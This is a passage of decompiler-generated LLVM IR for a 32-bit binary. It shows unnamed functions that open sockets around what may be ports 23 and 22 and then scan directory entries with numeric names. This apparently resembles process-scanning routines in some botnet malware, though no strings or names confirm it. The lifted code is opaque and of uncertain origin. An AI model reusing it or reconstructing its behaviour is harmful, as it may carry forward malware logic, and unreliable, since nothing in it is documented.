  store i32 %v2_804db56, i32* @ebx, align 4
  store i32 %v0_804d5e2, i32* @esi, align 4
  store i32 %v0_804d5e1, i32* @edi, align 4
  store i32 %v0_804d5e0, i32* @ebp, align 4
  ret i32 %v0_804db54

dec_label_pc_804db62:                             ; preds = %dec_label_pc_804d871, %dec_label_pc_804d859
  %v2_804db65 = inttoptr i32 %v1_804d866 to i32*
  %v3_804db65 = load i32, i32* %v2_804db65, align 4
  store i32 %v3_804db65, i32* %edx.global-to-local, align 4
  %v3_804db69 = inttoptr i32 %v0_804d866 to i32*
  store i32 %v3_804db65, i32* %v3_804db69, align 4
  %v0_804db6a = call i32 @function_8051dd4()
  store i32 %v0_804db6a, i32* %eax.global-to-local, align 4
  %v0_804db6f = load i32, i32* @esp, align 4
  %v1_804db6f = add i32 %v0_804db6f, 20
  %v2_804db6f = inttoptr i32 %v1_804db6f to i8*
  %v3_804db6f = load i8, i8* %v2_804db6f, align 1
  %v4_804db6f = sext i8 %v3_804db6f to i32
  store i32 %v4_804db6f, i32* @ebx, align 4
  %v1_804db74 = add i32 %v0_804db6f, 16
  br label %dec_label_pc_804db77

dec_label_pc_804db77:                             ; preds = %dec_label_pc_804d82d, %dec_label_pc_804db62
  %v0_804db77 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804db74, %dec_label_pc_804db62 ]
  %v1_804db7a = add i32 %v0_804db77, -16
  %v2_804db7a = inttoptr i32 %v1_804db7a to i32*
  store i32 1, i32* %v2_804db7a, align 4
  %v1_804db7c = sext i8 %stack_var_-8769.2 to i32
  %v2_804db7c = call i32 @function_8053630(i32 %v1_804db7c)
  store i32 %v2_804db7c, i32* %eax.global-to-local, align 4
  %v0_804db81 = load i32, i32* @esp, align 4
  %v1_804db81 = inttoptr i32 %v0_804db81 to i32*
  store i32 6, i32* %v1_804db81, align 4
  %v3_804db88 = call i32 @function_8050b60(i8 %stack_var_-8769.2)
  store i32 %v3_804db88, i32* %eax.global-to-local, align 4
  %v0_804db8d = load i32, i32* @esp, align 4
  %v1_804db8d = inttoptr i32 %v0_804db8d to i32*
  store i32 7, i32* %v1_804db8d, align 4
  %v3_804db94 = call i32 @function_8050b60(i8 %stack_var_-8769.2)
  store i32 %v3_804db94, i32* %eax.global-to-local, align 4
  %v0_804db99 = load i32, i32* @esp, align 4
  %v1_804db99 = inttoptr i32 %v0_804db99 to i32*
  store i32 9, i32* %v1_804db99, align 4
  %v3_804dba0 = call i32 @function_8050b60(i8 %stack_var_-8769.2)
  %v0_804dba5 = load i32, i32* @esp, align 4
  %v0_804dba8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dba8, i32* %eax.global-to-local, align 4
  %v1_804dbaa = add i32 %v0_804dba5, 8780
  %v1_804dbb0 = inttoptr i32 %v1_804dbaa to i32*
  %v2_804dbb0 = load i32, i32* %v1_804dbb0, align 4
  store i32 %v2_804dbb0, i32* @ebx, align 4
  %v3_804dbb0 = add i32 %v0_804dba5, 8784
  %v1_804dbb1 = inttoptr i32 %v3_804dbb0 to i32*
  %v2_804dbb1 = load i32, i32* %v1_804dbb1, align 4
  store i32 %v2_804dbb1, i32* @esi, align 4
  %v3_804dbb1 = add i32 %v0_804dba5, 8788
  %v1_804dbb2 = inttoptr i32 %v3_804dbb1 to i32*
  %v2_804dbb2 = load i32, i32* %v1_804dbb2, align 4
  store i32 %v2_804dbb2, i32* @edi, align 4
  %v3_804dbb2 = add i32 %v0_804dba5, 8792
  %v1_804dbb3 = inttoptr i32 %v3_804dbb2 to i32*
  %v2_804dbb3 = load i32, i32* %v1_804dbb3, align 4
  store i32 %v2_804dbb3, i32* @ebp, align 4
  ret i32 %v0_804dba8

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804d5e0
  %v3_804dbb5 = load i8, i8* %stack_var_-48, align 1
  %v4_804dbb5 = sext i8 %v3_804dbb5 to i32
  %v4_804dbcb = zext i8 %tmp47 to i32
  %v6_804dbcb = and i32 %v4_804dbb5, -256
  %v7_804dbcb = or i32 %v6_804dbcb, %v4_804dbcb
  store i32 %v7_804dbcb, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804d694

dec_label_pc_804dbee:                             ; preds = %dec_label_pc_804d99d.backedge, %dec_label_pc_804d9b3, %dec_label_pc_804d99d.preheader
  %v0_804d9a6.lcssa = phi i32 [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ], [ %v0_804d9a688, %dec_label_pc_804d9b3 ], [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ]
  %v0_804dbf1 = load i32, i32* @ebp, align 4
  %v3_804dbf1 = inttoptr i32 %v0_804d9a6.lcssa to i32*
  store i32 %v0_804dbf1, i32* %v3_804dbf1, align 4
  %v0_804dbf2 = call i32 @function_8051dd4()
  store i32 %v0_804dbf2, i32* %eax.global-to-local, align 4
  %v0_804dbf7 = load i32, i32* @esp, align 4
  %v1_804dbf7 = add i32 %v0_804dbf7, 16
  br label %dec_label_pc_804d859

; uselistorder directives
  uselistorder i32 %v1_804db08, { 1, 0 }
  uselistorder i32 %v1_804daf8, { 2, 0, 1 }
  uselistorder i32 %v0_804d9a1, { 1, 0, 2 }
  uselistorder i32 %v0_804daca, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804da9d, { 0, 2, 1 }
  uselistorder i32 %v0_804d9a688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804d98b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d90e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804d883, { 0, 2, 1 }
  uselistorder i32 %v1_804d866, { 1, 0 }
  uselistorder i32 %v0_804d866, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804d861, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d859, { 1, 0 }
  uselistorder i32 %v4_804d833, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d7ef, { 1, 0 }
  uselistorder i32 %v3_804d7e7, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7a5, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804d786, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804d783, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804db10, { 1, 0, 2 }
  uselistorder i32 %v0_804daf8, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804d735, { 0, 2, 1 }
  uselistorder i32 %v7_804d732, { 1, 0 }
  uselistorder i32 %v0_804d72f, { 1, 0 }
  uselistorder i32 %v4_804d6dc, { 1, 2, 0 }
  uselistorder i32 %v7_804d718, { 1, 0, 2 }
  uselistorder i32 %v1_804d72f, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804d706, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804d705, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804d744, { 1, 0, 2 }
  uselistorder i32 %v2_804d66a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804d5ea, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804d5e4, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_80515e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805436d.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8051700, { 1, 2, 0 }
  uselistorder i32 (i8*)* @function_80514e0, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 20, 21, 22, 16, 17, 23, 24, 25, 26, 27, 28, 29, 30, 31, 68, 32, 33, 34, 35, 62, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 64, 0, 65, 66, 67 }
  uselistorder label %dec_label_pc_804db77, { 1, 0 }
  uselistorder label %dec_label_pc_804db4e, { 1, 0 }
  uselistorder label %dec_label_pc_804d99d.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d9b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d859, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804d80b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d6ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804d783, { 1, 0 }
  uselistorder label %dec_label_pc_804d744, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d711, { 1, 0 }
  uselistorder label %dec_label_pc_804d705, { 1, 0 }
  uselistorder label %dec_label_pc_804d694, { 1, 0 }
}

define i32 @function_804dc00() local_unnamed_addr {
dec_label_pc_804dc00:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804dc0c = call i32 @function_8051d42(i32* null)
  store i32 %v2_804dc0c, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc0c, i32* @edi, align 4
  %v0_804dc13 = call i32 @function_8051aaf()
  store i32 %v0_804dc13, i32* %eax.global-to-local, align 4
  %v12_804dc18 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804dc13, i32* @global_var_80561c4.21, align 4
  %tmp113 = icmp slt i32 %v0_804dc13, 1
  br i1 %tmp113, label %dec_label_pc_804dc2f, label %dec_label_pc_804dc24

dec_label_pc_804dc24:                             ; preds = %dec_label_pc_804de10, %dec_label_pc_804dce1, %dec_label_pc_804dc2f, %dec_label_pc_804dc00
  %v0_804dc2e = phi i32 [ -1, %dec_label_pc_804dce1 ], [ 0, %dec_label_pc_804dc2f ], [ %v0_804dc13, %dec_label_pc_804dc00 ], [ 0, %dec_label_pc_804de10 ]
  ret i32 %v0_804dc2e

dec_label_pc_804dc2f:                             ; preds = %dec_label_pc_804dc00
  %v1_804dc2f = add i32 %v0_804dc13, 1
  %v8_804dc2f = icmp eq i32 %v1_804dc2f, 0
  store i32 %v1_804dc2f, i32* %eax.global-to-local, align 4
  br i1 %v8_804dc2f, label %dec_label_pc_804dc24, label %dec_label_pc_804dc32

dec_label_pc_804dc32:                             ; preds = %dec_label_pc_804dc2f
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5888, i32* %stack_var_-8460, align 4
  %v1_804dc4f = call i32 @function_804d5e0(i32 5888)
  store i32 %v1_804dc4f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dc67 = call i32 @function_8052275(i32 2, i32 1, i32 0)
  store i32 %v3_804dc67, i32* %eax.global-to-local, align 4
  store i32 %v3_804dc67, i32* @ebx, align 4
  %v10_804dc71 = icmp eq i32 %v3_804dc67, -1
  br i1 %v10_804dc71, label %dec_label_pc_804dc94, label %dec_label_pc_804dc76

dec_label_pc_804dc76:                             ; preds = %dec_label_pc_804dc32
  %v2_804dc76 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dc76, i32* %eax.global-to-local, align 4
  %v0_804dc7d = load i32, i32* @edx, align 4
  store i32 %v3_804dc67, i32* %stack_var_-8460, align 4
  %v4_804dc82 = call i32 @function_805206f(i32 %v3_804dc67, i32 %v2_804dc76, i32 16, i32 %v0_804dc7d)
  store i32 %v4_804dc82, i32* %eax.global-to-local, align 4
  %v2_804dc87 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dc87, i32* @esi, align 4
  store i32 %v2_804dc76, i32* @ebp, align 4
  %v0_804dc8b = load i32, i32* @ebx, align 4
  store i32 %v0_804dc8b, i32* %stack_var_-8460, align 4
  %v2_804dc8c = call i32 @function_805212b(i32 %v0_804dc8b, i32 1)
  store i32 %v2_804dc8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc94

dec_label_pc_804dc94:                             ; preds = %dec_label_pc_804dc32, %dec_label_pc_804dc76
  store i32 5632, i32* %stack_var_-8460, align 4
  %v1_804dc9c = call i32 @function_804d5e0(i32 5632)
  store i32 %v1_804dc9c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dcb4 = call i32 @function_8052275(i32 2, i32 1, i32 0)
  store i32 %v3_804dcb4, i32* %eax.global-to-local, align 4
  store i32 %v3_804dcb4, i32* @ebx, align 4
  %v10_804dcbe = icmp eq i32 %v3_804dcb4, -1
  br i1 %v10_804dcbe, label %dec_label_pc_804dce1, label %dec_label_pc_804dcc3

dec_label_pc_804dcc3:                             ; preds = %dec_label_pc_804dc94
  %v2_804dcc3 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dcc3, i32* %eax.global-to-local, align 4
  %v0_804dcca = load i32, i32* @ecx, align 4
  store i32 %v3_804dcb4, i32* %stack_var_-8460, align 4
  %v4_804dccf = call i32 @function_805206f(i32 %v3_804dcb4, i32 %v2_804dcc3, i32 16, i32 %v0_804dcca)
  %v2_804dcd4 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dcd4, i32* %eax.global-to-local, align 4
  %v0_804dcd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dcd8, i32* %stack_var_-8460, align 4
  %v2_804dcd9 = call i32 @function_805212b(i32 %v0_804dcd8, i32 1)
  store i32 %v2_804dcd9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dce1

dec_label_pc_804dce1:                             ; preds = %dec_label_pc_804dc94, %dec_label_pc_804dcc3
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804dce6 = call i32 @function_8053630(i32 5)
  store i32 %v1_804dce6, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804dcf2 = call i32 @function_8052414(i32 4096)
  %v2_804dcf2 = inttoptr i32 %v1_804dcf2 to i8*
  store i32 %v1_804dcf2, i32* %eax.global-to-local, align 4
  store i32 %v1_804dcf2, i32* @global_var_80561c0.22, align 64
  store i8 0, i8* %v2_804dcf2, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_8056140.23, align 64
  %v2_804dd10 = call i32 @function_8050be0(i8 6)
  store i32 %v2_804dd10, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804dd1c = call i32 @function_8050be0(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804dd27 = call i32 @function_8050b30(i32 6, i32* null)
  %v2_804dd2c = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd2c, i32* @ebx, align 4
  %v2_804dd2f = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804dd38 = bitcast i32* %stack_var_-8388 to i8*
  %v3_804dd38 = call i32 @function_8051500(i8* %v2_804dd38, i32 %v3_804dd27)
  store i32 %v3_804dd38, i32* %eax.global-to-local, align 4
  %v2_804dd41 = add i32 %v3_804dd38, %v2_804dd2f
  store i32 %v2_804dd41, i32* @ebx, align 4
  %v0_804dd43 = call i32 @function_8051ad5()
  store i32 %v0_804dd43, i32* %eax.global-to-local, align 4
  %v2_804dd4b = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804dd43, i32* %stack_var_-8460, align 4
  %v3_804dd56 = sext i32 %v0_804dd43 to i64
  %v4_804dd56 = call i32 @function_80518f0(i64 %v3_804dd56, i32 10, i32 %v2_804dd4b)
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  %v0_804dd5e = load i32, i32* @ebx, align 4
  store i32 %v0_804dd5e, i32* %stack_var_-8460, align 4
  %v2_804dd5f = inttoptr i32 %v0_804dd5e to i8*
  %v3_804dd5f = call i32 @function_8051500(i8* %v2_804dd5f, i32 %v4_804dd56)
  %v2_804dd64 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd64, i32* @ebp, align 4
  %v0_804dd65 = load i32, i32* @ebx, align 4
  %v2_804dd65 = add i32 %v0_804dd65, %v3_804dd5f
  store i32 %v2_804dd65, i32* @ebx, align 4
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804dd6c = call i32 @function_8050b30(i32 7, i32* null)
  store i32 %v3_804dd6c, i32* %eax.global-to-local, align 4
  %v0_804dd74 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd74, i32* %stack_var_-8460, align 4
  %v2_804dd75 = inttoptr i32 %v0_804dd74 to i8*
  %v3_804dd75 = call i32 @function_8051500(i8* %v2_804dd75, i32 %v3_804dd6c)
  store i32 %v3_804dd75, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v3_804dd85 = call i32 @function_8051b92(i8* %v2_804dd38, i32 0)
  store i32 %v3_804dd85, i32* %eax.global-to-local, align 4
  %v10_804dd8d = icmp eq i32 %v3_804dd85, -1
  br i1 %v10_804dd8d, label %dec_label_pc_804dc24, label %dec_label_pc_804dd96

dec_label_pc_804dd96:                             ; preds = %dec_label_pc_804dce1
  store i32 %v3_804dd85, i32* %stack_var_-8460, align 4
  %v1_804dd9a = call i32 @function_8051a81(i32 %v3_804dd85)
  store i32 %v1_804dd9a, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804dda6 = call i32 @function_8050b60(i8 6)
  store i32 %v2_804dda6, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804ddb2 = call i32 @function_8050b60(i8 7)
  %v0_804ddba = load i32, i32* @global_var_80561c0.22, align 64
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v4_804ddca = call i32 @function_8051c52(i8* %v2_804dd38, i32 %v0_804ddba, i32 4095)
  store i32 %v4_804ddca, i32* %eax.global-to-local, align 4
  %v10_804ddd4 = icmp eq i32 %v4_804ddca, -1
  br i1 %v10_804ddd4, label %dec_label_pc_804dde2, label %dec_label_pc_804ddd9

dec_label_pc_804ddd9:                             ; preds = %dec_label_pc_804dd96
  %v0_804ddd9 = load i32, i32* @global_var_80561c0.22, align 64
  store i32 %v0_804ddd9, i32* %eax.global-to-local, align 4
  %v2_804ddde = add i32 %v0_804ddd9, %v4_804ddca
  %v3_804ddde = inttoptr i32 %v2_804ddde to i8*
  store i8 0, i8* %v3_804ddde, align 1
  br label %dec_label_pc_804dde2

dec_label_pc_804dde2:                             ; preds = %dec_label_pc_804dd96, %dec_label_pc_804ddd9
  %v0_804dde8 = load i32, i32* @ebx, align 4
  %v1_804dde8 = load i32, i32* @esi, align 4
  %v2_804dde8 = sub i32 %v0_804dde8, %v2_804dd2f
  %v2_804ddeb = add i32 %v2_804dde8, %v1_804dde8
  %v0_804dded = load i32, i32* @edi, align 4
  store i32 %v0_804dded, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* @eax, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804ddfa = call i32 @function_8051570(i32 %v2_804dd2f, i32 %v2_804ddeb)
  store i32 %v2_804ddfa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de10

dec_label_pc_804de10:                             ; preds = %dec_label_pc_804e043, %dec_label_pc_804dde2
  %storemerge8 = phi i32 [ %v1_804e050, %dec_label_pc_804e043 ], [ %v12_804dc18, %dec_label_pc_804dde2 ]
  %v1_804de13 = add i32 %storemerge8, -16
  %v2_804de13 = inttoptr i32 %v1_804de13 to i32*
  store i32 6, i32* %v2_804de13, align 4
  %v2_804de15 = call i32 @function_8050be0(i8 0)
  store i32 %v2_804de15, i32* %eax.global-to-local, align 4
  %v0_804de1a = load i32, i32* @esp, align 4
  %v1_804de1a = inttoptr i32 %v0_804de1a to i32*
  %v2_804de1a = load i32, i32* %v1_804de1a, align 4
  store i32 %v2_804de1a, i32* %eax.global-to-local, align 4
  %v3_804de1a = add i32 %v0_804de1a, 4
  %v1_804de1b = inttoptr i32 %v3_804de1a to i32*
  store i32 0, i32* %v1_804de1b, align 4
  store i32 6, i32* %v1_804de1a, align 4
  %v3_804de20 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804de20, i32* %eax.global-to-local, align 4
  %v1_804de25 = load i32, i32* @esp, align 4
  %v2_804de25 = inttoptr i32 %v1_804de25 to i32*
  store i32 %v3_804de20, i32* %v2_804de25, align 4
  %v1_804de28 = call i32 @function_8051e44(i32 0)
  store i32 %v1_804de28, i32* %eax.global-to-local, align 4
  %v1_804de2d = load i32, i32* @esp, align 4
  %v2_804de2d = add i32 %v1_804de2d, 32
  %v3_804de2d = inttoptr i32 %v2_804de2d to i32*
  store i32 %v1_804de28, i32* %v3_804de2d, align 4
  %v0_804de34 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de34 = icmp eq i32 %v0_804de34, 0
  br i1 %v1_804de34, label %dec_label_pc_804dc24, label %dec_label_pc_804de3c

dec_label_pc_804de3c:                             ; preds = %dec_label_pc_804de10
  %v0_804de31 = load i32, i32* @esp, align 4
  %v2_804de3f = inttoptr i32 %v0_804de31 to i32*
  store i32 6, i32* %v2_804de3f, align 4
  %v2_804de41 = call i32 @function_8050b60(i8 0)
  store i32 %v2_804de41, i32* %eax.global-to-local, align 4
  %v0_804de46 = load i32, i32* @esp, align 4
  %v1_804de46 = add i32 %v0_804de46, 16
  br label %dec_label_pc_804de50

dec_label_pc_804de50:                             ; preds = %dec_label_pc_804e058, %dec_label_pc_804e064, %dec_label_pc_804de6a, %dec_label_pc_804e081, %dec_label_pc_804e038, %dec_label_pc_804deac, %dec_label_pc_804e31c, %dec_label_pc_804de3c
  %v0_804de50 = phi i32 [ %v1_804de46, %dec_label_pc_804de3c ], [ %v1_804e350, %dec_label_pc_804e31c ], [ %v1_804de9e, %dec_label_pc_804deac ], [ %v0_804e03a, %dec_label_pc_804e038 ], [ %v1_804e08b, %dec_label_pc_804e081 ], [ %v1_804de5d, %dec_label_pc_804de6a ], [ %v1_804de9e, %dec_label_pc_804e064 ], [ %v1_804de9e, %dec_label_pc_804e058 ]
  %v1_804de53 = add i32 %v0_804de50, 16
  %v2_804de53 = inttoptr i32 %v1_804de53 to i32*
  %v3_804de53 = load i32, i32* %v2_804de53, align 4
  store i32 %v3_804de53, i32* %eax.global-to-local, align 4
  %v2_804de57 = add i32 %v0_804de50, -16
  %v3_804de57 = inttoptr i32 %v2_804de57 to i32*
  store i32 %v3_804de53, i32* %v3_804de57, align 4
  %v0_804de58 = call i32 @function_8051f35()
  store i32 %v0_804de58, i32* %eax.global-to-local, align 4
  %v0_804de5d = load i32, i32* @esp, align 4
  store i32 %v0_804de58, i32* @edx, align 4
  %v1_804de62 = icmp eq i32 %v0_804de58, 0
  br i1 %v1_804de62, label %dec_label_pc_804e043, label %dec_label_pc_804de6a

dec_label_pc_804de6a:                             ; preds = %dec_label_pc_804de50
  %v1_804de5d = add i32 %v0_804de5d, 16
  %v1_804de6a = add i32 %v0_804de58, 11
  %v2_804de6a = inttoptr i32 %v1_804de6a to i8*
  %v3_804de6a = load i8, i8* %v2_804de6a, align 1
  %v4_804de6a = zext i8 %v3_804de6a to i32
  %v6_804de6a = and i32 %v0_804de58, -256
  %v7_804de6a = or i32 %v4_804de6a, %v6_804de6a
  %v1_804de6d = add i32 %v7_804de6a, -48
  %v8_804de6d = trunc i32 %v1_804de6d to i8
  store i32 %v1_804de6d, i32* %eax.global-to-local, align 4
  %v8_804de72 = icmp ugt i8 %v8_804de6d, 9
  br i1 %v8_804de72, label %dec_label_pc_804de50, label %dec_label_pc_804de74

dec_label_pc_804de74:                             ; preds = %dec_label_pc_804de6a
  store i32 %v1_804de6a, i32* @edi, align 4
  %v3_804de7a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v1_804de6a, i32* %v3_804de7a, align 4
  %v0_804de7b = call i32 @function_8053486()
  store i32 %v0_804de7b, i32* %eax.global-to-local, align 4
  %v0_804de80 = load i32, i32* @esp, align 4
  store i32 %v0_804de7b, i32* @ebp, align 4
  %v1_804de85 = add i32 %v0_804de80, 28
  %v2_804de85 = inttoptr i32 %v1_804de85 to i32*
  %v3_804de85 = load i32, i32* %v2_804de85, align 4
  %v1_804de89 = add i32 %v3_804de85, 1
  store i32 %v1_804de89, i32* %eax.global-to-local, align 4
  %v0_804de8a = load i32, i32* @esi, align 4
  store i32 %v1_804de89, i32* %v2_804de85, align 4
  %v5_804de90 = icmp slt i32 %v0_804de8a, %v0_804de7b
  %v0_804deb3 = load i32, i32* @esp, align 4
  %v1_804deb6 = add i32 %v0_804deb3, -16
  %v2_804deb6 = inttoptr i32 %v1_804deb6 to i32*
  store i32 0, i32* %v2_804deb6, align 4
  %v2_804deb8 = call i32 @function_8051d42(i32* null)
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  br i1 %v5_804de90, label %dec_label_pc_804deb3, label %dec_label_pc_804de92

dec_label_pc_804de92:                             ; preds = %dec_label_pc_804de74
  %v1_804de9c = load i32, i32* @ebx, align 4
  %v2_804de9c = sub i32 %v2_804deb8, %v1_804de9c
  store i32 %v2_804de9c, i32* %eax.global-to-local, align 4
  %v0_804de9e = load i32, i32* @esp, align 4
  %v1_804de9e = add i32 %v0_804de9e, 16
  %v1_804dea1 = add i32 %v2_804de9c, -600
  %v6_804dea1 = sub i32 599, %v2_804de9c
  %v7_804dea1 = and i32 %v6_804dea1, %v2_804de9c
  %v8_804dea1 = icmp slt i32 %v7_804dea1, 0
  %v9_804dea1 = icmp eq i32 %v1_804dea1, 0
  %v10_804dea1 = icmp slt i32 %v1_804dea1, 0
  %v3_804dea6 = icmp ne i1 %v10_804dea1, %v8_804dea1
  %v4_804dea6 = or i1 %v9_804dea1, %v3_804dea6
  br i1 %v4_804dea6, label %dec_label_pc_804e058, label %dec_label_pc_804deac

dec_label_pc_804deac:                             ; preds = %dec_label_pc_804de92
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804deb3:                             ; preds = %dec_label_pc_804de74
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  %v0_804debd = load i32, i32* @esp, align 4
  %v1_804debd = inttoptr i32 %v0_804debd to i32*
  store i32 6, i32* %v1_804debd, align 4
  %v1_804dec4 = load i32, i32* @esp, align 4
  %v2_804dec4 = add i32 %v1_804dec4, 24
  %v3_804dec4 = inttoptr i32 %v2_804dec4 to i32*
  store i32 %v2_804deb8, i32* %v3_804dec4, align 4
  %v2_804dec8 = call i32 @function_8050be0(i8 0)
  store i32 %v2_804dec8, i32* %eax.global-to-local, align 4
  %v0_804decd = load i32, i32* @esp, align 4
  %v1_804decd = inttoptr i32 %v0_804decd to i32*
  store i32 7, i32* %v1_804decd, align 4
  %v2_804ded4 = call i32 @function_8050be0(i8 0)
  store i32 %v2_804ded4, i32* %eax.global-to-local, align 4
  %v0_804ded9 = load i32, i32* @esp, align 4
  %v1_804ded9 = inttoptr i32 %v0_804ded9 to i32*
  %v3_804ded9 = add i32 %v0_804ded9, 4
  %v1_804deda = inttoptr i32 %v3_804ded9 to i32*
  %v2_804deda = load i32, i32* %v1_804deda, align 4
  store i32 %v2_804deda, i32* @ebx, align 4
  store i32 0, i32* %v1_804deda, align 4
  store i32 6, i32* %v1_804ded9, align 4
  %v3_804dedf = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804dedf, i32* %eax.global-to-local, align 4
  %v0_804dee4 = load i32, i32* @esp, align 4
  %v1_804dee4 = inttoptr i32 %v0_804dee4 to i32*
  %v3_804dee4 = add i32 %v0_804dee4, 4
